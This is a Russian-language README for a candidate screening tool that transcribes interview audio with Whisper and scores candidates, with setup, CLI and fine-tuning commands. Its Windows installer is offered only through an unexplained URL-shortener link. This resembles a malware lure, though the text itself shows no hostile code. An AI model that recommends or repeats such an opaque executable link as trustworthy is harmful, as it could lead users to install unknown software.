# Candidate Screening System

Система первичного скрининга кандидатов:
1. принимает интервью в JSON или аудио;
2. делает транскрибацию через Whisper;
3. передаёт результат в rule-based или neural-оценщик;
4. сохраняет отчёт в `.json` и `.txt`.

## Установщмк для Windows

Ссылка для скачивания: https://clck.ru/3TDPyz

## Установка через терминал (Windows, Linux, MacOS)
```bash
python -m venv .venv
```

Linux/macOS:
```bash
source .venv/bin/activate
pip install -r dev-requirements.txt
```

Windows PowerShell:
```powershell
.venv\Scripts\Activate.ps1
pip install -r dev-requirements.txt
```

## Быстрый запуск (JSON -> оценка)
```bash
python candidate_screening_system.py --demo --output-dir output
python candidate_screening_system.py --input output/sample_interview.json --output-dir output
```

## Аудио -> TXT/JSON (Whisper-small)
```bash
python candidate_screening_system.py \
  --transcribe \
  --transcribe-only \
  --audio ./interviews/candidate_001.wav \
  --candidate-id candidate_001 \
  --vacancy-title "Менеджер по работе с клиентами" \
  --vacancy-description "Работа с клиентами, CRM, KPI" \
  --output-dir output
```

## Полный конвейер (аудио -> оценка)
```bash
python candidate_screening_system.py \
  --transcribe \
  --audio ./interviews/candidate_001.wav \
  --candidate-id candidate_001 \
  --vacancy-title "Менеджер по работе с клиентами" \
  --vacancy-description "Работа с клиентами, CRM, KPI" \
  --engine rule \
  --output-dir output
```

## Информация для разработчиков

## Fine-tuning Whisper (опционально)
```bash
python training/build_asr_manifest.py \
  --audio-dir training/asr_raw/audio \
  --transcript-dir training/asr_raw/text \
  --recursive \
  --out-dir training/asr_data

python training/finetune_whisper.py \
  --train-manifest training/asr_data/train.jsonl \
  --val-manifest training/asr_data/val.jsonl \
  --model-name openai/whisper-tiny \
  --language ru \
  --output-dir training/whisper_finetuned \
  --epochs 5 \
  --batch-size 2 \
  --grad-accum 4
```

## Тесты
```bash
pytest -q
```

## Примечание по репозиторию
В `.gitignore` уже исключены:
- кэши и временные артефакты;
- `output/`;
- тяжёлые чекпоинты Whisper;
- сырые локальные аудиоданные из `training/asr_raw/*`.
